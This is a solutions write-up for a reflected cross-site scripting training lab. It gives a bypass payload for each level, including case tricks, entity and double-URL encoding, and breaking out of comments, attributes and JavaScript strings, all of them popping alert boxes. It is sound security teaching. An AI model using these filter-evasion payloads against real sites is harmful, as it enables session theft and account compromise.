# RXSS labs

<p>Open <a href="https://hackxpert.com/RXSS/GET" target=”_blank”>RXSS</a> in a new tab ;D</p>

<iframe src="https://hackxpert.com/RXSS/GET" width="100%" height="700px"></iframe>

<p>This lab is based on<a href="https://brutelogic.com.br/blog/" target=”_blank”> brute's lab</a>.</p>

## Solutions

### 00: Supposed to be safe

### 10: Basic HTML XSS

Anything goes here, there is no protection

### 11

Here we introduced a filter to stop script and alert

```javascript
<img src=x onerror=confirm()>

<sCript>confirm()</sCript>
```

### 12

Here we added confirm to our filter

```javascript
<img src=x onerror=prompt()>

<sCript>prompt()</sCript>
```

### 13

Here we put your input to lowercase before sanitising it, making `<sCript>prompt()</sCript>` no longer a valid bypass

```javascript
<img src=x onerror=prompt()>
```

### 14

`>` seems to be stripped but we can still think of attacks without `>`

```javascript
<svg onload=alert(1)//
```

### 15

`<` is blocked here but we are in luck because the target uses `html_entity_decode` on our input
`<` can be replaced by `&lt;`

```javascript
&lt;img src=x onerror=alert()>
```

### 16

`<` is still blocked but this time we are `URLdecoding` your input. Not just one time but twice!

This means you will have to double encode your URL values:

```javascript
%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E %2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
```

### 17

Parenthesis are blocked BUT we can use the HTML entities

```javascript
<svg onload=alert&lpar;1&rpar;>

<svg onload=alert&#40;1&#41>
```

### 20

Your code is reflected between the HTML comments so you need to end them:

`-->`

Then you can enter your text:

```javascript
<!--><svg onload=alert(1)-->
```

### 30: HTML tag attribute XSS

We can see a new input tag appearing on the page upon submitting a value
We can break out with

```javascript
'><img src=x onerror=alert()>
```

### 40: JS XSS

We can see a new script appearing on the page upon submitting a value
This does a `document.write('')`
We can break out with

```javascript
');alert();//
```

### 50: You need to disguise your XSS attack to LOOK like an email address, for example

```javascript
"><svg/onload=alert(1)>"@x.y
```
